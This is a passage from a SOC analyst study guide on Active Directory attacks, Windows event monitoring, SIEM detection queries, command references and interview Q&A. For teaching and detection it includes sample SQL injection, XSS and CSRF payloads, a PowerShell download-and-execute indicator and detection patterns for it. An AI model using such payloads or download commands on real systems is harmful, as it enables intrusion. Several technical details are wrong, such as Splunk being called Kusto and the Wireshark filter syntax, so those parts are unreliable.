### NTLM (Legacy, Weak)

- **How**: Challenge-response using password hash.
- **Weakness**: Vulnerable to pass-the-hash attacks (attacker uses hash directly without knowing password).
- **SOC L1**: NTLM authentication is "Plan B" when Kerberos fails; higher risk.


### Kerberos (Standard, Preferred)

- **How**: Covered in Section 10 above.
- **Strength**: Mutual authentication; time-limited tickets.
- **SOC L1**: Monitor for Kerberos attacks (golden ticket, kerberoasting).

---

## AD Attack Techniques (Common SOC L1 Scenarios)

### 1. Credential Theft → Lateral Movement

**Attack Chain**:

```
1. Attacker compromises User A's workstation (phishing malware).
2. Malware runs Mimikatz → extracts User A's Kerberos TGT.
3. Attacker uses TGT to access domain controller (Admin-equivalent access).
4. Attacker creates new admin account: "BackdoorAdmin".
5. Attacker logs in as BackdoorAdmin; pivots to sensitive systems.
```

**Detection** (SOC L1):

- Alert: Mimikatz process detected (signature).
- Alert: Unusual domain controller access from workstation IP.
- Alert: New admin account created outside change management.
- Alert: BackdoorAdmin logging in from unusual locations.

**Response**:

- Isolate User A's workstation.
- Force password reset (User A + admin accounts).
- Audit domain controller logs; find timeline of attacker actions.
- Delete BackdoorAdmin account; audit other accounts.


### 2. Pass-the-Hash Attack

**Attack**:

```
1. Attacker steals password hash of Domain Admin from domain controller memory.
2. Attacker doesn't crack hash; directly uses hash for authentication.
3. Attacker accesses file servers, databases as Domain Admin.
```

**Defense**:

- Use Kerberos (doesn't send password hash over network).
- Enable Windows Defender Credential Guard (protects hashes in memory).
- Monitor for unusual logon types (Kerberos vs NTLM).

**Detection**:

- Alert: Logon with NTLM from unexpected source (Kerberos is standard).
- Alert: Domain Admin login from workstation.


### 3. Privilege Escalation via AD Group Membership

**Attack**:

```
1. Attacker compromises User A (low privilege).
2. Attacker finds User A has modify rights on AD "Finance_Admin" group.
3. Attacker adds User A to "Finance_Admin" group.
4. Attacker logs in as User A; now has finance admin access.
```

**Detection** (SOC L1):

- Alert: User added to high-privilege group.
- Alert: Unusual access to AD management tools (Active Directory Users \& Computers).
- Alert: Finance admin accessing systems at 3 AM (outside work hours).

**Response**:

- Remove User A from Finance_Admin group.
- Audit all group membership changes; find timeline.
- Force password reset.

---

## AD Reconnaissance (Attacker Perspective; SOC Detection)

### Tools Attackers Use

- **BloodHound**: Maps AD relationships; finds privilege escalation paths.
    - Detection: Monitor for LDAP queries en masse; BloodHound uses specific query patterns.
- **Mimikatz**: Dumps credentials from memory.
    - Detection: Process creation of lsass.exe child processes (unusual); use EDR.
- **PowerView**: Enumerates AD users/groups/permissions.
    - Detection: PowerShell with specific LDAP queries; log all PowerShell.


### What Attackers Enumerate

- **Users**: Find admin accounts, service accounts (often weak passwords).
- **Groups**: Identify high-privilege groups (Domain Admins, Enterprise Admins).
- **Shares**: Find file servers with sensitive data.
- **Trusts**: Discover forest trusts (lateral movement paths).
- **ACLs**: Find users with modify rights (attack surface).

**SOC L1 Detection**:

- Large LDAP queries.
- Unusual PowerShell commands querying AD.
- Tools like AdFind, BloodHound on network.

---

## AD Auditing (SOC L1 Monitoring)

### Critical Events to Monitor

| Event ID | Description | Alert Threshold |
| :-- | :-- | :-- |
| 4624 | Successful logon | Monitor for logon type 3 (network) outside work hours |
| 4625 | Failed logon | > 5 failures in 5 min = brute force attempt |
| 4720 | User account created | Off-hours or non-IT user = suspicious |
| 4722 | User account enabled | Any enable outside change management = suspicious |
| 4725 | User account disabled | Unexpected disables = potential attack |
| 4726 | User account deleted | Same as create; very suspicious |
| 4728 | Member added to group | Track adds to high-privilege groups |
| 4732 | Member added to local group | Local admin additions = escalation risk |
| 4735 | Group modified | Permission changes on critical groups |
| 4740 | User account locked | Could indicate brute force or attack |
| 4741 | Computer account created | New workstations; validate if legitimate |
| 4768 | Kerberos TGT requested | Normal, but pattern anomalies = attack |
| 4769 | Kerberos TGS requested | Normal, but requests for admin services = risk |
| 4771 | Kerberos pre-auth failed | Password spray attempt likely |
| 4776 | NTLM auth | Prefer Kerberos; NTLM = fallback or legacy |

### SIEM Queries (Pseudocode)

**Detect brute force attempt**:

```
Event 4625 (failed logon)
  | where: same user, multiple failures, short timespan
  | threshold: >= 5 failures in 5 minutes
  | alert: "Brute force attempt on [user]"
```

**Detect privilege escalation via group add**:

```
Event 4728 (member added to group)
  | where: group = "Domain Admins" OR "Enterprise Admins"
  | where: user NOT in IT department
  | alert: "Non-IT user added to admin group: [user] → [group]"
```

**Detect unusual logon**:

```
Event 4624 (successful logon)
  | where: user = "Domain Admin"
  | where: logon time = night/weekend
  | where: source IP != known admin subnets
  | alert: "Admin logon from unusual time/location: [user] from [IP] at [time]"
```


---

# 12. TOOLS \& COMMANDS REFERENCE

## Network Analysis Tools

### nmap (Network Mapper)

```bash
# Scan for open ports
nmap target.com

# Scan specific port range
nmap -p 1-65535 target.com

# Scan with OS detection
nmap -O target.com

# Scan with version detection
nmap -sV target.com

# Aggressive scan (OS, version, script)
nmap -A target.com

# Scan for specific service
nmap -p 22,80,443 target.com

# Output to file
nmap target.com -oN output.txt

# SOC Use**: Reconnaissance detection; baseline port changes
```


### Wireshark (Packet Analyzer)

```
Capture Filter (what to capture):
  tcp.port == 443 (HTTPS only)
  udp.port == 53 (DNS only)
  ip.src == 192.168.1.100 (specific IP)
  
Display Filter (what to show):
  dns (show DNS packets only)
  http (show HTTP)
  tcp.flags.syn == 1 (SYN packets; port scanning indicator)
  ip.dst == 8.8.8.8 (destination Google DNS)
  
Follow Stream: Right-click packet → Follow TCP/UDP Stream (reassemble data)

SOC Use: Anomalous connections, C2 traffic, data exfiltration
```


### dig / nslookup (DNS Queries)

```bash
# Query A record
dig example.com

# Query MX record
dig example.com MX

# Query TXT record (SPF, DKIM, DMARC)
dig example.com TXT

# Query specific nameserver
dig @ns1.example.com example.com

# Reverse DNS
dig -x 93.184.216.34

# SOC Use**: Phishing investigation; domain enumeration; DNSSEC validation
```


### netstat / ss (Network Connections)

```bash
# Show listening ports
netstat -an | grep LISTEN

# Show established connections
netstat -an | grep ESTABLISHED

# Show process associated with connection
netstat -antp (Linux) / netstat -anob (Windows)

# SOC Use**: Identify unexpected listening ports; C2 beaconing connections
```


---

## SIEM Query Examples (KQL for Microsoft Sentinel, Kusto for Splunk)

### Detect Brute Force (KQL/Splunk)

```kusto
SecurityEvent
| where EventID == 4625
| summarize FailedAttempts = count() by UserName, ComputerName
| where FailedAttempts >= 5
```


### Detect PowerShell IEX (KQL)

```kusto
SecurityEvent
| where EventID == 4688
| where CommandLine contains "IEX" or CommandLine contains "Invoke-Expression"
| where CommandLine contains "WebClient" or CommandLine contains "DownloadString"
```


### Detect DNS Tunneling (Splunk)

```spl
index=main sourcetype=dns_query
| stats count by query
| where count > 100
| lookup known_domains domain AS query OUTPUT is_known
| where is_known = 0
```


### Detect File Creation in System Dirs (KQL)

```kusto
DeviceFileEvents
| where FolderPath contains "C:\\Windows\\Temp" or FolderPath contains "C:\\Temp"
| where FileName endswith ".exe" or FileName endswith ".ps1" or FileName endswith ".bat"
| summarize by FileName, FolderPath, InitiatingProcessCommandLine
```


---

## Command-Line Tools

### Windows

**ipconfig** (network config):

```cmd
ipconfig /all (detailed)
ipconfig /release (release DHCP)
ipconfig /renew (get new DHCP)
```

**tasklist / taskkill** (processes):

```cmd
tasklist (show processes)
tasklist /v (verbose)
taskkill /PID 1234 (kill process)
```

**netstat** (connections):

```cmd
netstat -ano (all connections with PIDs)
netstat -an | findstr LISTENING (listening ports)
```

**Get-EventLog** (PowerShell):

```powershell
Get-EventLog -LogName Security -EventId 4625 -Newest 100
Get-EventLog -LogName Security | Where {$_.TimeGenerated -gt (Get-Date).AddHours(-2)}
```


### Linux

**netstat / ss** (connections):

```bash
ss -tulpn (listening ports with process)
ss -tan | grep ESTABLISHED (established connections)
```

**ps aux** (processes):

```bash
ps aux (all processes)
ps aux | grep malware (find specific process)
```

**find** (search files):

```bash
find / -name "malware.exe" (search for file)
find /tmp -type f -mtime -1 (files modified in last day)
```

**grep** (search text):

```bash
grep -r "attacker.com" /var/log (search logs for C2 domain)
grep -E "^[0-9]{3}\.[0-9]{3}" /var/log/auth.log (find IPs in auth logs)
```


---

# 13. RED FLAGS \& DETECTION PATTERNS

## File-Level Red Flags

| Red Flag | Indicator | Why Suspicious | Action |
| :-- | :-- | :-- | :-- |
| Executable in Temp | C:\Windows\Temp\malware.exe | Malware often drops in temp | Quarantine; scan with AV |
| File in wrong location | svchost.exe in C:\Users\Downloads | Legitimate svchost in System32 only | Investigate parent process; may be impersonation |
| Double extension | invoice.pdf.exe | User thinks it's PDF; actually exe | Block; educate user |
| Unsigned executable | File with no digital signature | Legitimate Windows files are signed | Verify with vendor |
| Recent creation, high entropy | New .exe with random-looking content | Malware compressed/encrypted | Scan; check against threat intel |
| File size anomaly | malware.exe (5 MB, should be <1 MB) | Packed malware (compression) | Detonate in sandbox |


---

## Network-Level Red Flags

| Red Flag | Indicator | Why Suspicious | Action |
| :-- | :-- | :-- | :-- |
| Beaconing | Periodic connection to same IP:port every 60 sec | C2 heartbeat | Block destination; hunt for backdoor |
| DNS query to typo domain | `gooogle.com` instead of `google.com` | Phishing domain; possible malware C2 | Block domain; notify user |
| Outbound to high-risk port | Outbound to 443 from random host (not web browser) | Possible C2 (HTTPS encryption) | Inspect TLS cert; check destination reputation |
| Large outbound transfer | 10 GB upload at 2 AM | Data exfiltration | Quarantine host; check what transferred |
| Connection to reserved IP | 192.0.2.100 (reserved for docs) | Spoofing or misconfiguration | Investigate; unusual in prod |
| DNS to IP (no resolution) | Query for 192.168.1.100 as domain | DNS tunnel or exploit attempt | Block; investigate source |


---

## Process-Level Red Flags

| Red Flag | Indicator | Why Suspicious | Action |
| :-- | :-- | :-- | :-- |
| Unsigned child process | explorer.exe spawns malware.exe | explorer.exe rarely spawns exes | Kill process; scan |
| LOLBin unusual arguments | powershell.exe -Command "IEX(WebClient).Download..." | PowerShell downloading code | Investigate parent; check history |
| Process from Temp | C:\Temp\malware.exe -parent explorer.exe | Malware in temp; unusual parent | Quarantine; collect forensics |
| Service creation | net.exe creating new service | Could be persistence | Check if legitimate; rollback if not |
| Reverse shell indicators | cmd.exe connecting to external IP | Attacker shell | Kill connection; isolate host |


---

## Authentication-Level Red Flags

| Red Flag | Indicator | Why Suspicious | Action |
| :-- | :-- | :-- | :-- |
| Failed logons spike | 50 failures for user "admin" in 1 hour | Brute force attempt | Lock account; reset password; block source IP |
| Logon from unusual location | Domain Admin login from 1.2.3.4 (foreign country) | Account compromise or insider | Revoke session; investigate |
| Logon outside hours | User login at 3 AM on Sunday | Unusual activity | Contact user; verify legitimacy |
| Service account logon | Service account used for interactive logon | Service accounts shouldn't be used interactively | Investigate; change password |
| Logon type mismatch | Kerberos logon but NTLM auth observed | Auth protocol downgrade | Check Kerberos; fallback to NTLM indicates issues |


---

# 14. 100+ SCENARIO-BASED Q\&A

## Core Fundamentals Q\&A

### Q1: What is the difference between CIA and AAA?

**Answer**: CIA (Confidentiality, Integrity, Availability) are **security goals**—what you're protecting. AAA (Authentication, Authorization, Accountability) are **mechanisms** to achieve CIA.

- CIA answers "what"; AAA answers "how."
- Example: CIA goal = confidentiality (data not leaked). AAA implementation = authentication (verify user) + encryption (protect data).


### Q2: Why is encryption not enough to protect passwords?

**Answer**: Encryption is reversible; passwords should be irreversible.

- If password encrypted and encryption key leaked, attacker can decrypt → plaintext password.
- Hashing is one-way; even with hash, attacker can't recover plaintext (in theory).
- Defense: Store password hash (bcrypt), not encrypted password.


### Q3: Explain the principle of least privilege in AD context.

**Answer**: Users should have minimum permissions needed for their job.

- User A works in Finance; shouldn't have access to HR data.
- User A shouldn't be Domain Admin (way too much access).
- Implementation: RBAC (role-based); Finance_Read group vs Finance_Write group.
- Benefit: If account compromised, attacker access limited to user's role.


### Q4: What is the difference between a threat and a vulnerability?

**Answer**:

- **Vulnerability**: Weakness (e.g., unpatched software, weak password policy).
- **Threat**: Potential danger / attacker (e.g., malware, hacker, insider).
- **Risk**: Combination (probability × impact). Unpatched Windows + advanced malware = high risk.


### Q5: Why has Telnet been replaced by SSH?

**Answer**: Telnet sends credentials + commands in plaintext; SSH encrypts all traffic.

- Telnet on public Wi-Fi = attacker can sniff password with tcpdump.
- SSH uses AES encryption → traffic unreadable even if captured.
- SSH also provides mutual authentication via host keys.

---

## Networking \& Ports Q\&A

### Q6: What are the well-known ports? List critical ones.

**Answer**: Ports 0-1023 require privileged access; assigned by IANA.

- FTP: 20/21 (plaintext, deprecated; use SFTP).
- SSH: 22 (encrypted remote access).
- SMTP: 25 (email; often blocked by ISPs).
- DNS: 53 (domain resolution).
- HTTP: 80 (web, plaintext).
- HTTPS: 443 (web, encrypted).
- SMB: 445 (Windows file sharing; vulnerable to ransomware).
- RDP: 3389 (Windows remote desktop; brute-force target).

**Interview Twist**: "Why is port 25 often blocked?" → ISPs block to prevent spam (anyone can send mail if port 25 open). Modern email uses port 587 (SMTP with TLS) + authentication.

### Q7: What's the difference between TCP and UDP?

**Answer**:

- **TCP**: Connection-oriented, reliable, ordered. Uses 3-way handshake. Services: HTTP, HTTPS, SSH, SMTP, FTP.
- **UDP**: Connectionless, fast, unreliable. No handshake. Services: DNS, DHCP, NTP, VoIP, gaming.
- **Trade-off**: TCP slower but guaranteed delivery; UDP faster but packets may drop.
- **SOC Context**: UDP floods (DDoS); TCP SYN floods (DoS); monitor both for anomalies.


### Q8: Explain TCP 3-way handshake; how to detect SYN flood.

**Answer**:

- **Handshake**: Client SYN → Server SYN-ACK → Client ACK (connection ready).
- **SYN Flood Attack**: Attacker sends many SYN packets; never completes handshake. Server exhausts resources waiting for completion.
- **Detection**: Monitor for high number of SYN packets with no corresponding ACK. Use firewall/IDS to track incomplete connections.
- **Defense**: SYN cookies (server encodes state in SYN-ACK sequence number; no state stored).


### Q9: What is DHCP? Explain DORA.

**Answer**: DHCP = Dynamic Host Configuration Protocol (automatic IP assignment).

- **DORA Process**:

1. **Discover**: Client broadcasts "I need an IP!" to DHCP server.
2. **Offer**: Server responds "Here's IP 192.168.1.10; lease 24 hours."
3. **Request**: Client accepts offer; requests IP officially.
4. **Acknowledge**: Server confirms; client now has IP.
- **SOC**: Monitor for DHCP spoofing (attacker sends fake DHCP offers → redirect traffic to attacker).


### Q10: Explain DNS resolution; how does attacker spoof DNS?

**Answer**:

- **Resolution**: Client → Resolver → Root → TLD → Authoritative server → IP returned.
- **Spoofing**: Attacker sends fake DNS response (forged source IP) before legitimate response arrives.
- **Cache Poisoning**: Fake response cached → all future queries return attacker's IP.
- **Example**: User queries for bank.com; attacker intercepts, returns 10.10.10.10 (phishing server); user lands on fake banking site.
- **Defense**: DNSSEC (signs DNS responses), source port randomization.

---

## DNS \& Email Security Q\&A

### Q11: What does SPF record do? Limitations?

**Answer**:

- **Purpose**: Publish list of IPs authorized to send mail for your domain.
- **Example**: acme.com SPF = "ip4:192.0.2.0 include:_spf.google.com ~all"
- **Check**: Receiver sees email from acme.com; checks SPF; if source IP in list → SPF pass.
- **Limitations**:
    - Only checks envelope-from (5321.From), not display From (5322.From) → spoofing still possible.
    - Broken by mail forwarding (forwarder's IP not in original sender's SPF).
    - No integrity check (doesn't prevent tampering).
- **SOC**: If attacker's IP not in SPF record → email should fail SPF; receiving server has choice to accept anyway (depending on policy).


### Q12: DKIM vs SPF—which is better?

**Answer**: Both complement each other; neither complete alone.

- **SPF**: Checks if sending IP authorized; broken by forwarding.
- **DKIM**: Digitally signs email; survives forwarding; protects integrity.
- **Together**: SPF (checks sender IP) + DKIM (checks signature) → strong phishing defense.
- **SOC**: Check both in headers; if both fail + domain is known → phishing likely.


### Q13: What does DMARC policy do?

**Answer**: Defines what receiver should do if SPF/DKIM fails.

- **Policies**:
    - `p=none`: Accept anyway; just report failures (monitoring).
    - `p=quarantine`: Move to spam if fail.
    - `p=reject`: Reject entirely if fail.
- **Example**: dmarc.acme.com = "p=reject" means "if SPF/DKIM fail, reject email" → strong phishing prevention.
- **SOC**: Aggregate reports (daily summaries) help identify spoofing/phishing attempts.


### Q14: You receive email with red flags. Walk me through the header check.

**Answer**:

```
Email: "Password Reset from support@acme.com"

Step 1: Check From header
  From: support@acme.com
  
Step 2: Check authentication results
  Authentication-Results: acme.com
    spf=FAIL (email source IP not in acme.com SPF)
    dkim=FAIL (signature domain is attacker.com, not acme.com)
    dmarc=FAIL (spf/dkim not aligned to acme.com)

Step 3: Check Return-Path / Sender
  Return-Path: bounce@attacker.com ← MISMATCH!
  
Step 4: Check link destination
  <a href="https://acme-reset.xyz/password-reset">
  ← Domain is acme-reset.xyz, not acme.com → PHISHING

Action: Block sender; quarantine email; alert user.
```


---

## Cryptography \& PKI Q\&A

### Q15: Hash vs encryption—explain with examples.

**Answer**:

- **Hash**: One-way function. Input → Output (hash). Can't reverse.
    - Example: password123 → (SHA256) → ef92b778...
    - Use: Password storage, file integrity, fingerprinting.
    - Can't decrypt: Even admin can't recover original password; users must reset if forgotten.
- **Encryption**: Two-way function. Input + Key → Output (cipher). Reverse with key.
    - Example: password123 + key(AES) → ciphertext. Decrypt with key → password123 (recoverable).
    - Use: Protecting data in transit (TLS), at rest (disk encryption).
    - Risky for passwords: If encryption key leaked, passwords leaked.

**Interview Twist**: "Your company accidentally stores passwords encrypted instead of hashed. Why is this bad?" → If encryption key compromised, all passwords stolen instantly.

### Q16: What is PKI? Components?

**Answer**: Public Key Infrastructure = system for managing public keys, certificates, trust.

- **Components**:
    - **CA (Certificate Authority)**: Trusted entity signing certificates.
    - **Certificate**: Binding public key to identity (CN=example.com).
    - **Public Key**: Encrypt data; available to all.
    - **Private Key**: Decrypt data; kept secret.
    - **Key Pair**: Public + Private (asymmetric).
    - **Trust Store**: Browser/OS holding trusted root CAs.
    - **CRL/OCSP**: Revocation mechanisms (certificate no longer valid).


### Q17: How does TLS handshake work (simplified)?

**Answer**:

```
Client → Server: "I want secure connection"
Server → Client: "Here's my certificate" (public key inside)
Client: "Verify certificate with CA public key" (in my trust store)
Client → Server: "Let's use AES key 0x123456" (encrypted with server's public key)
Server: "Decrypt with my private key" (gets AES key)
Both: Now communicate with AES (encrypted, fast)
```


---

## Web Application Security Q\&A

### Q18: Explain SQL injection; how to prevent.

**Answer**:

- **Vulnerability**: App builds SQL query by concatenating user input.
    - Vulnerable: `query = "SELECT * FROM users WHERE username='" + username + "'"`
    - Input: `username = admin' --`
    - Result: `SELECT * FROM users WHERE username='admin' --'` (comment removes password check)
    - Impact: Bypass authentication, dump database, delete data, RCE.
- **Prevention**:

1. **Parameterized Queries**: `query("SELECT * FROM users WHERE username=?", [username])`
        - Database treats ? as placeholder; user input never interpreted as SQL.
2. **Input Validation**: Whitelist allowed characters; reject special chars.
3. **ORMs**: Django ORM, SQLAlchemy handle queries safely.
4. **WAF**: Web Application Firewall detects SQL injection patterns.


### Q19: What is XSS? Types and examples.

**Answer**:

- **Definition**: Attacker injects script into web app; runs in user's browser.
- **Stored XSS**: Script saved in database; affects many users.
    - Example: Comment `<script>alert('XSS')</script>` saved; all users see alert.
- **Reflected XSS**: Script in URL; affects user who clicks link.
    - Example: `google.com/search?q=<script>alert('XSS')</script>` → script in response.
- **DOM-based XSS**: Client-side JavaScript processes untrusted input unsafely.
    - Example: `document.getElementById('result').innerHTML = location.hash` → attacker controls HTML.
- **Prevention**:

1. Output encoding: `<` → `&lt;`, `>` → `&gt;`.
2. Input validation: Whitelist characters.
3. CSP header: `Content-Security-Policy: default-src 'self'`.
4. Frameworks: React, Vue auto-encode by default.


### Q20: Explain CSRF; how to prevent.

**Answer**:

- **Attack**: Attacker's website makes request to victim's authenticated site without victim realizing.
    - Victim logged into bank.com (session cookie valid).
    - Victim visits attacker.com (while logged into bank).
    - attacker.com contains: `<form action="bank.com/transfer" method="POST">` (auto-submit).
    - Browser sends bank.com request WITH session cookie.
    - Bank processes transfer (thinks request is from victim).
- **Prevention**:

1. **CSRF Token**: Form includes unique token; attacker can't predict.
2. **SameSite Cookie**: Browser doesn't send cookie for cross-site requests.
3. **Referer Check**: Verify request came from your domain.

---

## Malware \& Threat Analysis Q\&A

### Q21: What are IOCs? Give examples; explain their role in SOC.

**Answer**: Indicators of Compromise = artifacts suggesting malware infection.

- **Types**:
    - File hashes: Malware binary signature.
    - IP addresses: C2 server.
    - Domains: Attacker's domain.
    - File paths: Where malware dropped (C:\Temp\malware.exe).
    - Registry keys: Persistence mechanisms.
    - Mutexes: Unique malware ID preventing reinfection.
- **SOC Role**:

1. Receive IOCs from threat intel (VirusTotal, OSINT, incident response).
2. Search SIEM for matches (hunt for malware).
3. Block IOCs (firewall rules, DNS filtering).
4. Escalate findings (send to incident response).
- **Example**: Found malware.exe (MD5: abc123).
    - Step 1: Extract IOCs: MD5, strings (C2: attacker.com:4444).
    - Step 2: Search SIEM for other files with same hash.
    - Step 3: Search for connections to attacker.com:4444.
    - Step 4: Notify affected systems for remediation.


### Q22: What is living-off-the-land (LoTL)? Give examples; detect?

**Answer**:

- **Definition**: Attacker uses legitimate OS tools (PowerShell, cmd, WMI) instead of malware.
- **Why**: Bypasses signature-based detection (tools are trusted).
- **Examples**:
    - PowerShell IEX to download payload.
    - certutil.exe to decode/encode files.
    - psexec for lateral movement.
    - Cron jobs for Linux persistence.
- **Detection**:

1. Monitor PowerShell command line (Event ID 4688).
2. Look for suspicious patterns: IEX, DownloadString, base64.
3. Whitelist known good scripts.
4. Behavioral analysis: PowerShell rarely needs network access.
5. Correlate: PowerShell + network connection + new file → suspicious.


### Q23: What's in a malware report? Walk me through analysis.

**Answer**: Reports from VirusTotal, Hybrid Analysis, ANY.RUN, etc.

**Report Contents**:

- **File Info**: Hash (MD5, SHA256), size, type, creation date.
- **Detection**: How many antivirus engines flag it? Verdict?
- **Strings**: Readable text (C2 domain, file paths, error messages).
- **Behavior**: What does it do? (Network connections, file ops, process creation).
- **Network**: Domains/IPs it contacts; ports.
- **Static Analysis**: Imports (what APIs it calls).
- **Dynamic Analysis**: Sandbox execution log.

**SOC Workflow**:

```
1. File hash found in alert.
2. Look up hash in VirusTotal.
3. If 45+ engines flag as Trojan → confirmed malicious.
4. Extract IOCs: domains, IPs, file paths, mutexes.
5. Search SIEM for those IOCs.
6. Escalate confirmed findings.
```


---

## Attack Frameworks Q\&A

### Q24: Map a phishing attack to Cyber Kill Chain.

**Answer**:

```
1. Reconnaissance: Attacker researches company; finds CEO name on LinkedIn; finds employee emails on website.

2. Weaponization: Attacker creates malicious Excel file with macro payload.

3. Delivery: Attacker crafts email spoofing CEO; attaches "Budget_2024.xlsx"; sends to finance team.

4. Exploitation: Finance employee opens Excel; macro prompts to "Enable Macros"; macro runs PowerShell.

5. Installation: PowerShell downloads malware; installs as scheduled task for persistence.

6. Command & Control: Malware beacons to attacker.com:4444 every 60 seconds.

7. Actions on Objectives: Attacker issues commands: steal credentials (Mimikatz), access files, move laterally.
```


### Q25: Map the same phishing attack to MITRE ATT\&CK.

**Answer**:

```
Tactic: Reconnaissance
  Technique: Search Open Websites/Domains (LinkedIn, company website)

Tactic: Resource Development
  Technique: Develop Capabilities (create macro payload)
  Technique: Acquire Infrastructure (attacker.com C2)

Tactic: Initial Access
  Technique: Phishing (spear-phishing email with attachment)

Tactic: Execution
  Technique: User Execution (user opens Excel, enables macros)
  Technique: Command and Scripting Interpreter (PowerShell macro)

Tactic: Persistence
  Technique: Scheduled Task/Job (malware creates scheduled task)

Tactic: Defense Evasion
  Technique: Obfuscated Files or Information (base64 PowerShell)
  Technique: Disable or Modify Tools (disable AV/logging)

Tactic: Credential Access
  Technique: OS Credential Dumping (Mimikatz extract credentials)

Tactic: Lateral Movement
  Technique: Use Alternate Authentication Material (pass-the-hash with stolen credentials)

Tactic: Command & Control
  Technique: Application Layer Protocol (HTTP POST beacons)

Tactic: Exfiltration
  Technique: Exfiltration Over C2 Channel (send files to attacker)

Tactic: Impact
  Technique: Data Encrypted for Impact (ransomware encryption)
```


### Q26: Pyramid of Pain—explain with example.

**Answer**:

- **Level 1 (Hash)**: Attacker recompiles code → new hash. Effort to change: trivial.
- **Level 2 (IP)**: Attacker rents new VPS. Effort: easy.
- **Level 3 (Domain)**: Attacker registers new domain. Effort: medium (days).
- **Level 4 (Attack Pattern)**: Attacker learns new exploitation technique. Effort: weeks/months.
- **Level 5 (Tools)**: Attacker develops new malware. Effort: months/years.
- **Level 6 (TTP)**: Attacker changes fundamental approach. Effort: very hard (years).

**Example**:

- Attacker A uses Emotet malware; C2 domains: emotet1.com, emotet2.com; IPs: 10.0.0.1, 10.0.0.2.
- You block emotet1.com (Level 3) → attacker switches to emotet3.com (easy).
- You detect PowerShell + base64 + IEX pattern (Level 4) → attacker harder-pressed (learns different technique).
- You identify "spear-phishing + Emotet + lateral movement via Pass-the-Hash" TTP (Level 6) → attacker would need to fundamentally change operations (very hard).

**SOC Lesson**: Invest in TTP detection; more sustainable than blocking hashes/IPs.

---

## Incident Response Q\&A

### Q27: Walk through incident response steps for "Malware Detected on Workstation."

**Answer**:

```
PHASE 1: DETECTION & ANALYSIS
  1. Alert: "Malware.exe (SHA256: abc123) detected on 192.168.1.100."
  2. Triage: Is this real? Check multiple sources (AV, SIEM, endpoint EDR).
  3. Owner: Who works on 192.168.1.100? Check inventory.
  4. Timeline: When first detected? Any related alerts before this?
  5. Context: Check SIEM for:
     - Network connections from 192.168.1.100 (C2 IP/domain?).
     - Process creation (parent of malware process?).
     - File creation (where did it come from?).
  6. Severity: Is malware known (VirusTotal lookup)? Does it exfiltrate data? → Severity HIGH.

PHASE 2: CONTAINMENT
  Short-term:
    - Isolate 192.168.1.100 from network (unplug network cable or firewall rule).
    - Notify user (avoid panic; explain for security).
  
  Investigation (don't shut down yet; preserve evidence):
    - Collect memory dump (RAM contains running malware).
    - Collect disk artifacts.
    - Screenshot current state.
    - Document timeline.

PHASE 3: ERADICATION
  - Quarantine malware.exe.
  - Kill malware processes.
  - Scan entire disk with multiple antivirus engines.
  - Check for persistence (Registry Run keys, scheduled tasks, startup folders).
  - Remove persistence mechanisms.
  - Reset user password (attacker may have stolen credentials).

PHASE 4: RECOVERY
  - Reboot workstation (clean boot).
  - Verify malware gone (AV scan, behavioral monitoring).
  - Restore any deleted/corrupted files from backup.
  - Restore network connectivity.

PHASE 5: POST-INCIDENT
  - Analyze: How did malware get there? (Phishing? Drive-by download?)
  - Lessons learned: Update email filter? Disable macros? Deploy EDR?
  - Share IOCs: Add malware hash + C2 domain to blocklist.
  - Document case: Timeline, actions, resolution.
```


### Q28: User reports: "I accidentally clicked a link in an email; browser warned about phishing."

**Answer**:

```
Step 1: Stay calm; thank user for reporting.

Step 2: Immediate actions:
  - Isolate user's workstation (disconnect from network).
  - Don't shut down (preserve evidence).
  - Ask user:
    * Did you enter any credentials? Password? 2FA code?
    * Did page load? What did you see?
    * Timestamp? Any downloads?

Step 3: Analysis:
  - Check browser history (EDR, proxy logs) → confirm URL.
  - Check for file downloads (malware?).
  - Search SIEM for network connections from workstation.
  - Check DNS queries (did browser try to resolve phishing domain?).
  - Query firewall (was phishing site blocked at network level?).

Step 4: Assess damage:
  - If user entered password: Force password reset; monitor login attempts.
  - If user entered 2FA code: Alert security team; watch for account compromise.
  - If download occurred: Scan file with AV; run in sandbox.
  - If no credential entry + no download: Likely no impact; monitor.

Step 5: Actions:
  - Block phishing domain at DNS/firewall.
  - Report URL to phishing takedown services.
  - Add to email filter blocklist.
  - Educate user (don't click unknown links).
  - Monitor user account for 24-48 hours.

Step 6: Reconnect workstation:
  - Scan for malware.
  - Verify clean boot.
  - Restore network access.
  - Monitor for indicators of compromise (unusual logins, file access, network activity).
```


---

## Active Directory Q\&A

### Q29: Explain AD objects; how they're used for access control.

**Answer**:

- **User Objects**: Represent people; contain credentials (password hash), attributes (email, department, manager).
- **Group Objects**: Contain user members; used for assigning permissions.
- **Computer Objects**: Represent devices; join domain; receive Group Policy.
- **OU (Organizational Unit)**: Hierarchical container for organizing objects; GPOs apply to OUs.

**Access Control Example**:

```
1. Create group: "Finance_Read_Access"
2. Add Finance team users to group.
3. Share file/folder on server: "\\server\Finance_Shared"
4. Set NTFS permissions: "Finance_Read_Access" → Read-only.
5. Result: All users in group automatically have read access; no per-user permissions needed.
6. Benefit: Add/remove user from group → access granted/revoked.
```


### Q30: What is Kerberos? How does it prevent pass-the-hash?

**Answer**:

- **Kerberos**: Network authentication protocol; uses tickets instead of passwords over network.
- **Flow**:

1. User enters password once at login.
2. KDC validates password hash; issues TGT (proof of authentication).
3. User caches TGT locally.
4. When accessing resource, user presents TGT to get service ticket.
5. Service ticket sent to resource; resource decrypts with its key; grants access.
- **Pass-the-Hash Prevention**:
    - NTLM: Sends password hash over network; attacker intercepts and reuses hash.
    - Kerberos: Password never sent over network (only hash at login); tickets used instead.
    - Tickets are time-limited; encrypted with resource-specific key; harder to abuse.
    - If attacker steals TGT, still bound to original user's ticket request.

**Note**: Kerberos still vulnerable to Pass-the-Ticket (TGT theft); better than NTLM, not perfect.

### Q31: Explain AD privilege escalation; detection.

**Answer**:

- **Vertical Escalation**: User → Local Admin → Domain Admin.
- **Horizontal Escalation**: User A → User B (same privilege level; more data access).

**Common Techniques**:

1. **UAC Bypass** (Windows): Attacker exploits UAC prompt bypass → elevate without admin password.
2. **Unquoted Service Path**: Service path not quoted; Windows executes first portion as program.
    - Example: `C:\Program Files\Vulnerable Service\service.exe`
    - If executable without full path, attacker creates `C:\Program Files\Vulnerable.exe` → runs with service privilege.
3. **AD Delegation**: Account A has "delegate to" service B. Attacker impersonates other users via delegation.
4. **Group Membership Change**: Attacker adds self to high-privilege group (requires admin first, but escalation).

**Detection**:

- Monitor for UAC bypass attempts (Event 4688 with specific keywords).
- Monitor service creation/modification.
- Monitor group membership changes (Event 4728 → member added to Domain Admins).
